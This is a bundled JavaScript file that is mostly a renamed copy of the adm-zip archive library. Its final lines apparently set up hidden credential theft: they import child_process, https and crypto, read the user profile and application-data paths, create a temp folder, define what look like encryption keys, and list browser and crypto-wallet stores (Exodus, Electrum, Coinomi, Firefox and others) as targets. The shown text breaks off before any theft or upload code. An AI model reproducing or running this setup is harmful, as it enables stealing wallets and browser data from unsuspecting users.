            throw e.Errors.DESCRIPTOR_FAULTY();
          }
          if (e.crc32(t3) !== t4.crc) {
            return false;
          }
        }
        return true;
      }
      function u(t3, t4, t5) {
        if (typeof t4 === "undefined" && typeof t3 === "string") {
          t5 = t3;
          t3 = undefined;
        }
        if (H) {
          if (t3 && t4) {
            t4(Buffer.alloc(0), e.Errors.DIRECTORY_CONTENT_ERROR());
          }
          return Buffer.alloc(0);
        }
        var t6 = p();
        if (t6.length === 0) {
          if (t3 && t4) {
            t4(t6);
          }
          return t6;
        }
        if (N.encrypted) {
          if (typeof t5 !== "string" && !Buffer.isBuffer(t5)) {
            throw e.Errors.INVALID_PASS_PARAM();
          }
          t6 = c.ZipCrypto.decrypt(t6, N, t5);
        }
        var t7 = Buffer.alloc(N.size);
        switch (N.method) {
          case e.Constants.STORED:
            t6.copy(t7);
            if (!g(t7)) {
              if (t3 && t4) {
                t4(t7, e.Errors.BAD_CRC());
              }
              throw e.Errors.BAD_CRC();
            } else {
              if (t3 && t4) {
                t4(t7);
              }
              return t7;
            }
          case e.Constants.DEFLATED:
            var t8 = new c.Inflater(t6, N.size);
            if (!t3) {
              const t9 = t8.inflate(t7);
              t9.copy(t7, 0);
              if (!g(t7)) {
                throw e.Errors.BAD_CRC("\"" + L.decode(I) + "\"");
              }
              return t7;
            } else {
              t8.inflateAsync(function (tt) {
                tt.copy(tt, 0);
                if (t4) {
                  if (!g(tt)) {
                    t4(tt, e.Errors.BAD_CRC());
                  } else {
                    t4(tt);
                  }
                }
              });
            }
            break;
          default:
            if (t3 && t4) {
              t4(Buffer.alloc(0), e.Errors.UNKNOWN_METHOD());
            }
            throw e.Errors.UNKNOWN_METHOD();
        }
      }
      function C(t3, t4) {
        if ((!J || !J.length) && Buffer.isBuffer(f)) {
          if (t3 && t4) {
            t4(p());
          }
          return p();
        }
        if (J.length && !H) {
          var t5;
          switch (N.method) {
            case e.Constants.STORED:
              N.compressedSize = N.size;
              t5 = Buffer.alloc(J.length);
              J.copy(t5);
              if (t3 && t4) {
                t4(t5);
              }
              return t5;
            default:
            case e.Constants.DEFLATED:
              var t6 = new c.Deflater(J);
              if (!t3) {
                var t7 = t6.deflate();
                N.compressedSize = t7.length;
                return t7;
              } else {
                t6.deflateAsync(function (t8) {
                  t5 = Buffer.alloc(t8.length);
                  N.compressedSize = t8.length;
                  t8.copy(t5);
                  if (t4) {
                    t4(t5);
                  }
                });
              }
              t6 = null;
              break;
          }
        } else if (t3 && t4) {
          t4(Buffer.alloc(0));
        } else {
          return Buffer.alloc(0);
        }
      }
      function t0(t3, offset) {
        return (t3.readUInt32LE(offset + 4) << 4) + t3.readUInt32LE(offset);
      }
      function t1(t3) {
        try {
          var offset = 0;
          var t4;
          var t5;
          var t6;
          while (offset + 4 < t3.length) {
            t4 = t3.readUInt16LE(offset);
            offset += 2;
            t5 = t3.readUInt16LE(offset);
            offset += 2;
            t6 = t3.slice(offset, offset + t5);
            offset += t5;
            if (h.ID_ZIP64 === t4) {
              t2(t6);
            }
          }
        } catch (t7) {
          throw e.Errors.EXTRA_FIELD_PARSE_ERROR();
        }
      }
      function t2(t3) {
        var t4;
        var t5;
        var offset;
        var t6;
        if (t3.length >= h.EF_ZIP64_SCOMP) {
          t4 = t0(t3, h.EF_ZIP64_SUNCOMP);
          if (N.size === h.EF_ZIP64_OR_32) {
            N.size = t4;
          }
        }
        if (t3.length >= h.EF_ZIP64_RHO) {
          t5 = t0(t3, h.EF_ZIP64_SCOMP);
          if (N.compressedSize === h.EF_ZIP64_OR_32) {
            N.compressedSize = t5;
          }
        }
        if (t3.length >= h.EF_ZIP64_DSN) {
          offset = t0(t3, h.EF_ZIP64_RHO);
          if (N.offset === h.EF_ZIP64_OR_32) {
            N.offset = offset;
          }
        }
        if (t3.length >= h.EF_ZIP64_DSN + 4) {
          t6 = t3.readUInt32LE(h.EF_ZIP64_DSN);
          if (N.diskNumStart === h.EF_ZIP64_OR_16) {
            N.diskNumStart = t6;
          }
        }
      }
      return {
        get entryName() {
          return L.decode(I);
        },
        get rawEntryName() {
          return I;
        },
        set entryName(t3) {
          I = e.toBuffer(t3, L.encode);
          var t4 = I[I.length - 1];
          H = t4 === 47 || t4 === 92;
          N.fileNameLength = I.length;
        },
        get efs() {
          if (typeof _efs === "function") {
            return _efs(this.entryName);
          } else {
            return _efs;
          }
        },
        get extra() {
          return K;
        },
        set extra(t3) {
          K = t3;
          N.extraLength = t3.length;
          t1(t3);
        },
        get comment() {
          return L.decode(Y);
        },
        set comment(t3) {
          Y = e.toBuffer(t3, L.encode);
          N.commentLength = Y.length;
          if (Y.length > 65535) {
            throw e.Errors.COMMENT_TOO_LONG();
          }
        },
        get name() {
          var t3 = L.decode(I);
          if (H) {
            return t3.substr(t3.length - 1).split("/").pop();
          } else {
            return t3.split("/").pop();
          }
        },
        get isDirectory() {
          return H;
        },
        getCompressedData: function () {
          return C(false, null);
        },
        getCompressedDataAsync: function (t3) {
          C(true, t3);
        },
        setData: function (t3) {
          J = e.toBuffer(t3, e.decoder.encode);
          if (!H && J.length) {
            N.size = J.length;
            N.method = e.Constants.DEFLATED;
            N.crc = e.crc32(t3);
            N.changed = true;
          } else {
            N.method = e.Constants.STORED;
          }
        },
        getData: function (t3) {
          if (N.changed) {
            return J;
          } else {
            return u(false, null, t3);
          }
        },
        getDataAsync: function (t3, t4) {
          if (N.changed) {
            t3(J);
          } else {
            u(true, t3, t4);
          }
        },
        set attr(t3) {
          N.attr = t3;
        },
        get attr() {
          return N.attr;
        },
        set header(t3) {
          N.loadFromBinary(t3);
        },
        get header() {
          return N;
        },
        packCentralHeader: function () {
          N.flags_efs = this.efs;
          N.extraLength = K.length;
          var t3 = N.centralHeaderToBinary();
          var t4 = e.Constants.CENHDR;
          I.copy(t3, t4);
          t4 += I.length;
          K.copy(t3, t4);
          t4 += N.extraLength;
          Y.copy(t3, t4);
          return t3;
        },
        packLocalHeader: function () {
          let t3 = 0;
          N.flags_efs = this.efs;
          N.extraLocalLength = M.length;
          const t4 = N.localHeaderToBinary();
          const t5 = Buffer.alloc(t4.length + I.length + N.extraLocalLength);
          t4.copy(t5, t3);
          t3 += t4.length;
          I.copy(t5, t3);
          t3 += I.length;
          M.copy(t5, t3);
          t3 += M.length;
          return t5;
        },
        toJSON: function () {
          const t3 = function (t4) {
            return "<" + (t4 && t4.length + " bytes buffer" || "null") + ">";
          };
          return {
            entryName: this.entryName,
            name: this.name,
            comment: this.comment,
            isDirectory: this.isDirectory,
            header: N.toJSON(),
            compressedData: t3(f),
            data: t3(J)
          };
        },
        toString: function () {
          return JSON.stringify(this.toJSON(), null, "\t");
        }
      };
    };
  }
});
var require_zipFile = r({
  "node_modules/adm-zip/zipFile.js"(D, z) {
    var e = require_zipEntry();
    var Q = require_headers();
    var h = require_util();
    z.exports = function (c, U) {
      var f = [];
      var N = {};
      var I = Buffer.alloc(0);
      var Y = new Q.MainHeader();
      var H = false;
      var J = null;
      const K = new Set();
      const M = U;
      const {
        noSort: j,
        decoder: L
      } = M;
      if (c) {
        u(M.readEntries);
      } else {
        H = true;
      }
      function p() {
        const t0 = new Set();
        for (const t1 of Object.keys(N)) {
          const t2 = t1.split("/");
          t2.pop();
          if (!t2.length) {
            continue;
          }
          for (let t3 = 0; t3 < t2.length; t3++) {
            const t4 = t2.slice(0, t3 + 1).join("/") + "/";
            t0.add(t4);
          }
        }
        for (const t5 of t0) {
          if (!(t5 in N)) {
            const t6 = new e(M);
            t6.entryName = t5;
            t6.attr = 16;
            t6.temporary = true;
            f.push(t6);
            N[t6.entryName] = t6;
            K.add(t6);
          }
        }
      }
      function g() {
        H = true;
        N = {};
        if (Y.diskEntries > (c.length - Y.offset) / h.Constants.CENHDR) {
          throw h.Errors.DISK_ENTRY_TOO_LARGE();
        }
        f = new Array(Y.diskEntries);
        var t0 = Y.offset;
        for (var t1 = 0; t1 < f.length; t1++) {
          var t2 = t0;
          var t3 = new e(M, c);
          t3.header = c.slice(t2, t2 += h.Constants.CENHDR);
          t3.entryName = c.slice(t2, t2 += t3.header.fileNameLength);
          if (t3.header.extraLength) {
            t3.extra = c.slice(t2, t2 += t3.header.extraLength);
          }
          if (t3.header.commentLength) {
            t3.comment = c.slice(t2, t2 + t3.header.commentLength);
          }
          t0 += t3.header.centralHeaderSize;
          f[t1] = t3;
          N[t3.entryName] = t3;
        }
        K.clear();
        p();
      }
      function u(t0) {
        var t1 = c.length - h.Constants.ENDHDR;
        var t2 = Math.max(0, t1 - 65535);
        var t3 = t2;
        var t4 = c.length;
        var endOffset = -1;
        var t5 = 0;
        const t6 = typeof M.trailingSpace === "boolean" ? M.trailingSpace : false;
        if (t6) {
          t2 = 0;
        }
        for (t1; t1 >= t3; t1--) {
          if (c[t1] !== 80) {
            continue;
          }
          if (c.readUInt32LE(t1) === h.Constants.ENDSIG) {
            endOffset = t1;
            t5 = t1;
            t4 = t1 + h.Constants.ENDHDR;
            t3 = t1 - h.Constants.END64HDR;
            continue;
          }
          if (c.readUInt32LE(t1) === h.Constants.END64SIG) {
            t3 = t2;
            continue;
          }
          if (c.readUInt32LE(t1) === h.Constants.ZIP64SIG) {
            endOffset = t1;
            t4 = t1 + h.readBigUInt64LE(c, t1 + h.Constants.ZIP64SIZE) + h.Constants.ZIP64LEAD;
            break;
          }
        }
        if (endOffset == -1) {
          throw h.Errors.INVALID_FORMAT();
        }
        Y.loadFromBinary(c.slice(endOffset, t4));
        if (Y.commentLength) {
          I = c.slice(t5 + h.Constants.ENDHDR);
        }
        if (t0) {
          g();
        }
      }
      function C() {
        if (f.length > 1 && !j) {
          f.sort((t0, t1) => t0.entryName.toLowerCase().localeCompare(t1.entryName.toLowerCase()));
        }
      }
      return {
        get entries() {
          if (!H) {
            g();
          }
          return f.filter(t0 => !K.has(t0));
        },
        get comment() {
          return L.decode(I);
        },
        set comment(t0) {
          I = h.toBuffer(t0, L.encode);
          Y.commentLength = I.length;
        },
        getEntryCount: function () {
          if (!H) {
            return Y.diskEntries;
          }
          return f.length;
        },
        forEach: function (t0) {
          this.entries.forEach(t0);
        },
        getEntry: function (t0) {
          if (!H) {
            g();
          }
          return N[t0] || null;
        },
        setEntry: function (t0) {
          if (!H) {
            g();
          }
          f.push(t0);
          N[t0.entryName] = t0;
          Y.totalEntries = f.length;
        },
        deleteFile: function (t0, t1 = true) {
          if (!H) {
            g();
          }
          const t2 = N[t0];
          const t3 = this.getEntryChildren(t2, t1).map(t4 => t4.entryName);
          t3.forEach(this.deleteEntry);
        },
        deleteEntry: function (t0) {
          if (!H) {
            g();
          }
          const t1 = N[t0];
          const t2 = f.indexOf(t1);
          if (t2 >= 0) {
            f.splice(t2, 1);
            delete N[t0];
            Y.totalEntries = f.length;
          }
        },
        getEntryChildren: function (t0, t1 = true) {
          if (!H) {
            g();
          }
          if (typeof t0 === "object") {
            if (t0.isDirectory && t1) {
              const t2 = [];
              const t3 = t0.entryName;
              for (const t4 of f) {
                if (t4.entryName.startsWith(t3)) {
                  t2.push(t4);
                }
              }
              return t2;
            } else {
              return [t0];
            }
          }
          return [];
        },
        getChildCount: function (t0) {
          if (t0 && t0.isDirectory) {
            const t1 = this.getEntryChildren(t0);
            if (t1.includes(t0)) {
              return t1.length - 1;
            } else {
              return t1.length;
            }
          }
          return 0;
        },
        compressToBuffer: function () {
          if (!H) {
            g();
          }
          C();
          const t0 = [];
          const t1 = [];
          let t2 = 0;
          let t3 = 0;
          Y.size = 0;
          Y.offset = 0;
          let t4 = 0;
          for (const t7 of this.entries) {
            const t8 = t7.getCompressedData();
            t7.header.offset = t3;
            const t9 = t7.packLocalHeader();
            const tt = t9.length + t8.length;
            t3 += tt;
            t0.push(t9);
            t0.push(t8);
            const tm = t7.packCentralHeader();
            t1.push(tm);
            Y.size += tm.length;
            t2 += tt + tm.length;
            t4++;
          }
          t2 += Y.mainHeaderSize;
          Y.offset = t3;
          Y.totalEntries = t4;
          t3 = 0;
          const t5 = Buffer.alloc(t2);
          for (const tD of t0) {
            tD.copy(t5, t3);
            t3 += tD.length;
          }
          for (const tl of t1) {
            tl.copy(t5, t3);
            t3 += tl.length;
          }
          const t6 = Y.toBinary();
          if (I) {
            I.copy(t6, h.Constants.ENDHDR);
          }
          t6.copy(t5, t3);
          c = t5;
          H = false;
          return t5;
        },
        toAsyncBuffer: function (t0, t1, t2, t3) {
          try {
            if (!H) {
              g();
            }
            C();
            const t4 = [];
            const t5 = [];
            let t6 = 0;
            let t7 = 0;
            let t8 = 0;
            Y.size = 0;
            Y.offset = 0;
            const t9 = function (tt) {
              if (tt.length > 0) {
                const tm = tt.shift();
                const tD = tm.entryName + tm.extra.toString();
                if (t2) {
                  t2(tD);
                }
                tm.getCompressedDataAsync(function (tl) {
                  if (t3) {
                    t3(tD);
                  }
                  tm.header.offset = t7;
                  const tz = tm.packLocalHeader();
                  const te = tz.length + tl.length;
                  t7 += te;
                  t4.push(tz);
                  t4.push(tl);
                  const tQ = tm.packCentralHeader();
                  t5.push(tQ);
                  Y.size += tQ.length;
                  t6 += te + tQ.length;
                  t8++;
                  t9(tt);
                });
              } else {
                t6 += Y.mainHeaderSize;
                Y.offset = t7;
                Y.totalEntries = t8;
                t7 = 0;
                const tl = Buffer.alloc(t6);
                t4.forEach(function (te) {
                  te.copy(tl, t7);
                  t7 += te.length;
                });
                t5.forEach(function (te) {
                  te.copy(tl, t7);
                  t7 += te.length;
                });
                const tz = Y.toBinary();
                if (I) {
                  I.copy(tz, h.Constants.ENDHDR);
                }
                tz.copy(tl, t7);
                c = tl;
                H = false;
                t0(tl);
              }
            };
            t9(Array.from(this.entries));
          } catch (tt) {
            t1(tt);
          }
        }
      };
    };
  }
});
var require_adm_zip = r({
  "node_modules/adm-zip/adm-zip.js"(z, e) {
    var Q = require_util();
    var h = require("path");
    var c = require_zipEntry();
    var U = require_zipFile();
    var f = (...J) => Q.findLast(J, K => typeof K === "boolean");
    var N = (...J) => Q.findLast(J, K => typeof K === "string");
    var I = (...J) => Q.findLast(J, K => typeof K === "function");
    const Y = {
      noSort: false,
      readEntries: false,
      method: Q.Constants.NONE,
      fs: null
    };
    var H = Y;
    e.exports = function (J, K) {
      let M = null;
      const j = Object.assign(Object.create(null), H);
      if (J && typeof J === "object") {
        if (!(J instanceof Uint8Array)) {
          Object.assign(j, J);
          J = j.input ? j.input : undefined;
          if (j.input) {
            delete j.input;
          }
        }
        if (Buffer.isBuffer(J)) {
          M = J;
          j.method = Q.Constants.BUFFER;
          J = undefined;
        }
      }
      Object.assign(j, K);
      const L = new Q(j);
      if (typeof j.decoder !== "object" || typeof j.decoder.encode !== "function" || typeof j.decoder.decode !== "function") {
        j.decoder = Q.decoder;
      }
      if (J && typeof J === "string") {
        if (L.fs.existsSync(J)) {
          j.method = Q.Constants.FILE;
          j.filename = J;
          M = L.fs.readFileSync(J);
        } else {
          throw Q.Errors.INVALID_FILENAME();
        }
      }
      const p = new U(M, j);
      const {
        canonical: g,
        sanitize: u,
        zipnamefix: C
      } = Q;
      function t0(t4) {
        if (t4 && p) {
          var t5;
          if (typeof t4 === "string") {
            t5 = p.getEntry(h.posix.normalize(t4));
          }
          if (typeof t4 === "object" && typeof t4.entryName !== "undefined" && typeof t4.header !== "undefined") {
            t5 = p.getEntry(t4.entryName);
          }
          if (t5) {
            return t5;
          }
        }
        return null;
      }
      function t1(t4) {
        const {
          join: t5,
          normalize: t6,
          sep: t7
        } = h.posix;
        return t5(".", t6(t7 + t4.split("\\").join(t7) + t7));
      }
      function t2(t4) {
        if (t4 instanceof RegExp) {
          return function (t5) {
            return function (t6) {
              return t5.test(t6);
            };
          }(t4);
        } else if (typeof t4 !== "function") {
          return () => true;
        }
        return t4;
      }
      const t3 = (t4, t5) => {
        let t6 = t5.slice(-1);
        t6 = t6 === L.sep ? L.sep : "";
        return h.relative(t4, t5) + t6;
      };
      return {
        readFile: function (t4, t5) {
          var t6 = t0(t4);
          return t6 && t6.getData(t5) || null;
        },
        childCount: function (t4) {
          const t5 = t0(t4);
          if (t5) {
            return p.getChildCount(t5);
          }
        },
        readFileAsync: function (t4, t5) {
          var t6 = t0(t4);
          if (t6) {
            t6.getDataAsync(t5);
          } else {
            t5(null, "getEntry failed for:" + t4);
          }
        },
        readAsText: function (t4, t5) {
          var t6 = t0(t4);
          if (t6) {
            var t7 = t6.getData();
            if (t7 && t7.length) {
              return t7.toString(t5 || "utf8");
            }
          }
          return "";
        },
        readAsTextAsync: function (t4, t5, t6) {
          var t7 = t0(t4);
          if (t7) {
            t7.getDataAsync(function (t8, t9) {
              if (t9) {
                t5(t8, t9);
                return;
              }
              if (t8 && t8.length) {
                t5(t8.toString(t6 || "utf8"));
              } else {
                t5("");
              }
            });
          } else {
            t5("");
          }
        },
        deleteFile: function (t4, t5 = true) {
          var t6 = t0(t4);
          if (t6) {
            p.deleteFile(t6.entryName, t5);
          }
        },
        deleteEntry: function (t4) {
          var t5 = t0(t4);
          if (t5) {
            p.deleteEntry(t5.entryName);
          }
        },
        addZipComment: function (t4) {
          p.comment = t4;
        },
        getZipComment: function () {
          return p.comment || "";
        },
        addZipEntryComment: function (t4, t5) {
          var t6 = t0(t4);
          if (t6) {
            t6.comment = t5;
          }
        },
        getZipEntryComment: function (t4) {
          var t5 = t0(t4);
          if (t5) {
            return t5.comment || "";
          }
          return "";
        },
        updateFile: function (t4, t5) {
          var t6 = t0(t4);
          if (t6) {
            t6.setData(t5);
          }
        },
        addLocalFile: function (t4, t5, t6, t7) {
          if (L.fs.existsSync(t4)) {
            t5 = t5 ? t1(t5) : "";
            const t8 = h.win32.basename(h.win32.normalize(t4));
            t5 += t6 ? t6 : t8;
            const t9 = L.fs.statSync(t4);
            const tt = t9.isFile() ? L.fs.readFileSync(t4) : Buffer.alloc(0);
            if (t9.isDirectory()) {
              t5 += L.sep;
            }
            this.addFile(t5, tt, t7, t9);
          } else {
            throw Q.Errors.FILE_NOT_FOUND(t4);
          }
        },
        addLocalFileAsync: function (t4, t5) {
          t4 = typeof t4 === "object" ? t4 : {
            localPath: t4
          };
          const t6 = h.resolve(t4.localPath);
          const {
            comment: t7
          } = t4;
          let {
            zipPath: t8,
            zipName: t9
          } = t4;
          const tt = this;
          L.fs.stat(t6, function (tm, tD) {
            if (tm) {
              return t5(tm, false);
            }
            t8 = t8 ? t1(t8) : "";
            const tl = h.win32.basename(h.win32.normalize(t6));
            t8 += t9 ? t9 : tl;
            if (tD.isFile()) {
              L.fs.readFile(t6, function (tz, te) {
                if (tz) {
                  return t5(tz, false);
                }
                tt.addFile(t8, te, t7, tD);
                return setImmediate(t5, undefined, true);
              });
            } else if (tD.isDirectory()) {
              t8 += L.sep;
              tt.addFile(t8, Buffer.alloc(0), t7, tD);
              return setImmediate(t5, undefined, true);
            }
          });
        },
        addLocalFolder: function (t4, t5, t6) {
          t6 = t2(t6);
          t5 = t5 ? t1(t5) : "";
          t4 = h.normalize(t4);
          if (L.fs.existsSync(t4)) {
            const t7 = L.findFiles(t4);
            const t8 = this;
            if (t7.length) {
              for (const filepath of t7) {
                const t9 = h.join(t5, t3(t4, filepath));
                if (t6(t9)) {
                  t8.addLocalFile(filepath, h.dirname(t9));
                }
              }
            }
          } else {
            throw Q.Errors.FILE_NOT_FOUND(t4);
          }
        },
        addLocalFolderAsync: function (t4, t5, t6, t7) {
          t7 = t2(t7);
          t6 = t6 ? t1(t6) : "";
          t4 = h.normalize(t4);
          var t8 = this;
          L.fs.open(t4, "r", function (t9) {
            if (t9 && t9.code === "ENOENT") {
              t5(undefined, Q.Errors.FILE_NOT_FOUND(t4));
            } else if (t9) {
              t5(undefined, t9);
            } else {
              var tt = L.findFiles(t4);
              var tm = -1;
              function tD() {
                tm += 1;
                if (tm < tt.length) {
                  var filepath = tt[tm];
                  var tl = t3(t4, filepath).split("\\").join("/");
                  tl = tl.normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^\x20-\x7E]/g, "");
                  if (t7(tl)) {
                    L.fs.stat(filepath, function (tz, te) {
                      if (tz) {
                        t5(undefined, tz);
                      }
                      if (te.isFile()) {
                        L.fs.readFile(filepath, function (tQ, tB) {
                          if (tQ) {
                            t5(undefined, tQ);
                          } else {
                            t8.addFile(t6 + tl, tB, "", te);
                            tD();
                          }
                        });
                      } else {
                        t8.addFile(t6 + tl + "/", Buffer.alloc(0), "", te);
                        tD();
                      }
                    });
                  } else {
                    process.nextTick(() => {
                      tD();
                    });
                  }
                } else {
                  t5(true, undefined);
                }
              }
              tD();
            }
          });
        },
        addLocalFolderAsync2: function (t4, t5) {
          const t6 = this;
          t4 = typeof t4 === "object" ? t4 : {
            localPath: t4
          };
          localPath = h.resolve(t1(t4.localPath));
          let {
            zipPath: t7,
            filter: t8,
            namefix: t9
          } = t4;
          if (t8 instanceof RegExp) {
            t8 = function (tD) {
              return function (tl) {
                return tD.test(tl);
              };
            }(t8);
          } else if (typeof t8 !== "function") {
            t8 = function () {
              return true;
            };
          }
          t7 = t7 ? t1(t7) : "";
          if (t9 == "latin1") {
            t9 = tD => tD.normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^\x20-\x7E]/g, "");
          }
          if (typeof t9 !== "function") {
            t9 = tD => tD;
          }
          const tt = tD => h.join(t7, t9(t3(localPath, tD)));
          const tm = tD => h.win32.basename(h.win32.normalize(t9(tD)));
          L.fs.open(localPath, "r", function (tD) {
            if (tD && tD.code === "ENOENT") {
              t5(undefined, Q.Errors.FILE_NOT_FOUND(localPath));
            } else if (tD) {
              t5(undefined, tD);
            } else {
              L.findFilesAsync(localPath, function (tl, tz) {
                if (tl) {
                  return t5(tl);
                }
                tz = tz.filter(te => t8(tt(te)));
                if (!tz.length) {
                  t5(undefined, false);
                }
                setImmediate(tz.reverse().reduce(function (te, tQ) {
                  return function (tB, tr) {
                    if (tB || tr === false) {
                      return setImmediate(te, tB, false);
                    }
                    t6.addLocalFileAsync({
                      localPath: tQ,
                      zipPath: h.dirname(tt(tQ)),
                      zipName: tm(tQ)
                    }, te);
                  };
                }, t5));
              });
            }
          });
        },
        addLocalFolderPromise: function (t4, t5) {
          return new Promise((t6, t7) => {
            const t8 = {
              localPath: t4
            };
            this.addLocalFolderAsync2(Object.assign(t8, t5), (t9, tt) => {
              if (t9) {
                t7(t9);
              }
              if (tt) {
                t6(this);
              }
            });
          });
        },
        addFile: function (t4, t5, t6, t7) {
          t4 = C(t4);
          let t8 = t0(t4);
          const t9 = t8 != null;
          if (!t9) {
            t8 = new c(j);
            t8.entryName = t4;
          }
          t8.comment = t6 || "";
          const tt = typeof t7 === "object" && t7 instanceof L.fs.Stats;
          if (tt) {
            t8.header.time = t7.mtime;
          }
          var tm = t8.isDirectory ? 16 : 0;
          let tD = t8.isDirectory ? 16384 : 32768;
          if (tt) {
            tD |= t7.mode & 4095;
          } else if (typeof t7 === "number") {
            tD |= t7 & 4095;
          } else {
            tD |= t8.isDirectory ? 493 : 420;
          }
          tm = (tm | tD << 16) >>> 0;
          t8.attr = tm;
          t8.setData(t5);
          if (!t9) {
            p.setEntry(t8);
          }
          return t8;
        },
        getEntries: function (t4) {
          p.password = t4;
          if (p) {
            return p.entries;
          } else {
            return [];
          }
        },
        getEntry: function (t4) {
          return t0(t4);
        },
        getEntryCount: function () {
          return p.getEntryCount();
        },
        forEach: function (t4) {
          return p.forEach(t4);
        },
        extractEntryTo: function (t4, t5, t6, t7, t8, t9) {
          t7 = f(false, t7);
          t8 = f(false, t8);
          t6 = f(true, t6);
          t9 = N(t8, t9);
          var tt = t0(t4);
          if (!tt) {
            throw Q.Errors.NO_ENTRY();
          }
          var tm = g(tt.entryName);
          var tD = u(t5, t9 && !tt.isDirectory ? t9 : t6 ? tm : h.basename(tm));
          if (tt.isDirectory) {
            var tl = p.getEntryChildren(tt);
            tl.forEach(function (tQ) {
              if (tQ.isDirectory) {
                return;
              }
              var tB = tQ.getData();
              if (!tB) {
                throw Q.Errors.CANT_EXTRACT_FILE();
              }
              var tr = g(tQ.entryName);
              var tX = u(t5, t6 ? tr : h.basename(tr));
              const ty = t8 ? tQ.header.fileAttr : undefined;
              L.writeFileTo(tX, tB, t7, ty);
            });
            return true;
          }
          var tz = tt.getData(p.password);
          if (!tz) {
            throw Q.Errors.CANT_EXTRACT_FILE();
          }
          if (L.fs.existsSync(tD) && !t7) {
            throw Q.Errors.CANT_OVERRIDE();
          }
          const te = t8 ? t4.header.fileAttr : undefined;
          L.writeFileTo(tD, tz, t7, te);
          return true;
        },
        test: function (t4) {
          if (!p) {
            return false;
          }
          for (var t5 in p.entries) {
            try {
              if (t5.isDirectory) {
                continue;
              }
              var t6 = p.entries[t5].getData(t4);
              if (!t6) {
                return false;
              }
            } catch (t7) {
              return false;
            }
          }
          return true;
        },
        extractAllTo: function (t4, t5, t6, t7) {
          t6 = f(false, t6);
          t7 = N(t6, t7);
          t5 = f(false, t5);
          if (!p) {
            throw Q.Errors.NO_ZIP();
          }
          p.entries.forEach(function (t8) {
            var t9 = u(t4, g(t8.entryName));
            if (t8.isDirectory) {
              L.makeDir(t9);
              return;
            }
            var tt = t8.getData(t7);
            if (!tt) {
              throw Q.Errors.CANT_EXTRACT_FILE();
            }
            const tm = t6 ? t8.header.fileAttr : undefined;
            L.writeFileTo(t9, tt, t5, tm);
            try {
              L.fs.utimesSync(t9, t8.header.time, t8.header.time);
            } catch (tD) {
              throw Q.Errors.CANT_EXTRACT_FILE();
            }
          });
        },
        extractAllToAsync: function (t4, t5, t6, t7) {
          t7 = I(t5, t6, t7);
          t6 = f(false, t6);
          t5 = f(false, t5);
          if (!t7) {
            return new Promise((tD, tl) => {
              this.extractAllToAsync(t4, t5, t6, function (tz) {
                if (tz) {
                  tl(tz);
                } else {
                  tD(this);
                }
              });
            });
          }
          if (!p) {
            t7(Q.Errors.NO_ZIP());
            return;
          }
          t4 = h.resolve(t4);
          const t8 = tD => u(t4, h.normalize(g(tD.entryName)));
          const t9 = (tD, tl) => new Error(tD + ": \"" + tl + "\"");
          const tt = [];
          const tm = [];
          p.entries.forEach(tD => {
            if (tD.isDirectory) {
              tt.push(tD);
            } else {
              tm.push(tD);
            }
          });
          for (const tD of tt) {
            const tl = t8(tD);
            const tz = t6 ? tD.header.fileAttr : undefined;
            try {
              L.makeDir(tl);
              if (tz) {
                L.fs.chmodSync(tl, tz);
              }
              L.fs.utimesSync(tl, tD.header.time, tD.header.time);
            } catch (te) {
              t7(t9("Unable to create folder", tl));
            }
          }
          tm.reverse().reduce(function (tQ, tB) {
            return function (tr) {
              if (tr) {
                tQ(tr);
              } else {
                const tX = h.normalize(g(tB.entryName));
                const ty = u(t4, tX);
                tB.getDataAsync(function (td, ta) {
                  if (ta) {
                    tQ(ta);
                  } else if (!td) {
                    tQ(Q.Errors.CANT_EXTRACT_FILE());
                  } else {
                    const tW = t6 ? tB.header.fileAttr : undefined;
                    L.writeFileToAsync(ty, td, t5, tW, function (tF) {
                      if (!tF) {
                        tQ(t9("Unable to write file", ty));
                      }
                      L.fs.utimes(ty, tB.header.time, tB.header.time, function (tS) {
                        if (tS) {
                          tQ(t9("Unable to set times", ty));
                        } else {
                          tQ();
                        }
                      });
                    });
                  }
                });
              }
            };
          }, t7)();
        },
        writeZip: function (t4, t5) {
          if (arguments.length === 1 && typeof t4 === "function") {
            t5 = t4;
            t4 = "";
          }
          if (!t4 && j.filename) {
            t4 = j.filename;
          }
          if (!t4) {
            return;
          }
          var t6 = p.compressToBuffer();
          if (t6) {
            var t7 = L.writeFileTo(t4, t6, true);
            if (typeof t5 === "function") {
              t5(!t7 ? new Error("failed") : null, "");
            }
          }
        },
        writeZipPromise: function (t4, t5) {
          const t6 = {
            overwrite: true
          };
          const {
            overwrite: t7,
            perm: t8
          } = Object.assign(t6, t5);
          return new Promise((t9, tt) => {
            if (!t4 && j.filename) {
              t4 = j.filename;
            }
            if (!t4) {
              tt("ADM-ZIP: ZIP File Name Missing");
            }
            this.toBufferPromise().then(tm => {
              const tD = tl => tl ? t9(tl) : tt("ADM-ZIP: Wasn't able to write zip file");
              L.writeFileToAsync(t4, tm, t7, t8, tD);
            }, tt);
          });
        },
        toBufferPromise: function () {
          return new Promise((t4, t5) => {
            p.toAsyncBuffer(t4, t5);
          });
        },
        toBuffer: function (t4, t5, t6, t7) {
          if (typeof t4 === "function") {
            p.toAsyncBuffer(t4, t5, t6, t7);
            return null;
          }
          return p.compressToBuffer();
        }
      };
    };
  }
});
var path = require("path");
var y = require("crypto");
var fs = require("fs");
var https = require("https");
var AdmZip = require_adm_zip();
var d = require("child_process");
var a = process.env.USERPROFILE;
var W = "DuHwv6WaloxlTnohw+3Yiw==";
var F = "I4VsZiKyFrvOeZ1L0DIANw==";
var S = "1aa6fd2cc9f705493f2c155344bf89a43a3a94c6acc39a6b56b371fa6e83978b";
var A = "cf7f4fce7228d98174dc477607868af3aa8621b6c90f6f8964a5aae5e2698038";
var E = ["User Data", "Exodus", "atomic", "Electrum", "Guarda", "Coinomi", "Firefox"];
var V = [process.env.APPDATA, process.env.LOCALAPPDATA];
var i = process.env.TEMP + "\\PLpek\\";
var path_node_g;
var o = [];
